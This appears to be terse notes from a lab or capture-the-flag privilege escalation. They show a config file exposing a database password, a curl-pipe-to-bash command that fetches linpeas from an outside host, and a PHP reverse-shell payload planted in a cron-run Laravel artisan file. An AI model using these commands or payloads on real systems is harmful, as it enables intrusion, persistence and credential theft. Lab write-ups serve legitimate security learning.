```bash
cat config.php 
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
```

```bash
$ curl 10.10.14.21/linpeas.sh|bash
```

Cron jobs
![[Pasted image 20211109042812.png]]

edit /var/www/laravel/artisan with a reverse shell

Payload in artisan
```php
$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

![[Pasted image 20211109043133.png]]